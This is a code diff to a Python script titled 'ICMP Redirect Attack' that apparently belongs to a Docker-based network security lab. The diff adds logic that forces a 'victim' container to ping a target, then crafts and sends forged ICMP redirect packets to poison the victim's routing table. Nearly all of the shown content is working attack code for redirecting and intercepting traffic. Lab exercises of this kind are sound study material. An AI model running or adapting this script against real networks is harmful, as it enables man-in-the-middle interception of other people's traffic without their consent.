@@ -10,6 +10,8 @@ import struct
 import atexit
 import time
 import sys
+import subprocess
+import threading
 
 # ─── CONFIG ─────────────────────────────────────────────────────────────────────
 VICTIM_IP = "10.9.0.5"        # Victim's IP
@@ -160,9 +162,13 @@ def process_packet(packet):
     if not ip_header:
         return
     
-    # Check if this is traffic from victim to target
-    if (ip_header['src'] == VICTIM_IP and ip_header['dst'] == TARGET_IP):
-        print(f"🔍 Detected victim traffic: {VICTIM_IP} -> {TARGET_IP}")
+    # Debug: Print all packets from victim to help troubleshoot
+    if ip_header['src'] == VICTIM_IP:
+        print(f"🔍 Detected victim packet: {VICTIM_IP} -> {ip_header['dst']}")
+    
+    # Check if this is traffic from victim to target network (not just specific target)
+    if (ip_header['src'] == VICTIM_IP and ip_header['dst'].startswith('192.168.60.')):
+        print(f"🎯 Target traffic detected: {VICTIM_IP} -> {ip_header['dst']}")
         send_icmp_redirect(ip_packet)
 
 def setup_ip_forwarding():
@@ -178,6 +184,27 @@ def cleanup():
     print("   Run: docker exec victim ip route")
 
 # ─── MAIN FUNCTION ─────────────────────────────────────────────────────────────────
+def trigger_victim_traffic():
+    """Trigger victim to send traffic to target, then capture it"""
+    print("🔥 Triggering victim to send traffic to target...")
+    
+    def victim_ping():
+        try:
+            subprocess.run([
+                'docker', 'exec', 'victim', 'ping', '-c', '1', TARGET_IP
+            ], capture_output=True, timeout=10)
+        except:
+            pass
+    
+    # Start ping in background
+    ping_thread = threading.Thread(target=victim_ping)
+    ping_thread.start()
+    
+    # Give it a moment to start
+    time.sleep(1)
+    
+    return ping_thread
+
 def main():
     """Main function"""
     print("🚀 ICMP Redirect Attack")
@@ -194,21 +221,75 @@ def main():
     # Enable IP forwarding
     setup_ip_forwarding()
     
-    # Create a raw socket
-    print(f"📡 Sniffing for victim traffic on {IFACE}...")
-    print("Press Ctrl+C to stop")
-    
-    raw_socket = setup_raw_socket()
+    print("📡 Starting ICMP Redirect Attack...")
+    print("⚠️  Note: Modern kernels require ICMP redirects to reference actual traffic")
+    print("    Triggering victim traffic first, then sending redirects")
+    print("")
     
     try:
-        while True:
-            # Receive packet
-            packet = raw_socket.recv(65565)
-            process_packet(packet)
+        for count in range(1, 4):
+            print(f"🔄 Attack attempt #{count}")
             
+            # Trigger victim to send traffic
+            ping_thread = trigger_victim_traffic()
+            
+            # Wait a moment for the packet to be sent
+            time.sleep(2)
+            
+            print(f"� Sending ICMP redirect #{count} to {VICTIM_IP}")
+            
+            # Create a realistic packet that victim would send
+            realistic_packet = create_dummy_packet()
+            send_icmp_redirect(realistic_packet)
+            
+            # Wait for ping to complete
+            ping_thread.join(timeout=5)
+            
+            # Check victim's routing table
+            print("   Checking victim's routing table...")
+            time.sleep(2)
+            
+            print(f"   Run: docker exec victim ip route")
+            
+        print("✅ Attack sequence complete!")
+        print("   Check victim's routing table with: docker exec victim ip route")
+                
     except KeyboardInterrupt:
         print("\n🛑 Attack stopped by user")
         sys.exit(0)
+
+def create_dummy_packet():
+    """Create a dummy IP packet from victim to target to trigger redirect"""
+    # IP header
+    version = 4
+    ihl = 5
+    tos = 0
+    tot_len = 28  # IP header (20) + ICMP header (8)
+    id = 12345
+    frag_off = 0
+    ttl = 64
+    protocol = 1  # ICMP
+    check = 0
+    saddr = socket.inet_aton(VICTIM_IP)
+    daddr = socket.inet_aton(TARGET_IP)
+    
+    # Pack IP header
+    ip_header = struct.pack('!BBHHHBBH4s4s', 
+                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
+                           ttl, protocol, check, saddr, daddr)
+    
+    # Calculate IP checksum
+    ip_checksum = checksum(ip_header)
+    ip_header = struct.pack('!BBHHHBBH4s4s', 
+                           (version << 4) + ihl, tos, tot_len, id, frag_off, 
+                           ttl, protocol, ip_checksum, saddr, daddr)
+    
+    # Simple ICMP ping payload
+    icmp_header = struct.pack('!BBHHH', 8, 0, 0, 12345, 1)  # Echo request
+    icmp_checksum = checksum(icmp_header)
+    icmp_header = struct.pack('!BBHHH', 8, 0, icmp_checksum, 12345, 1)
+    
+    return ip_header + icmp_header
 
 if __name__ == "__main__":
     main()
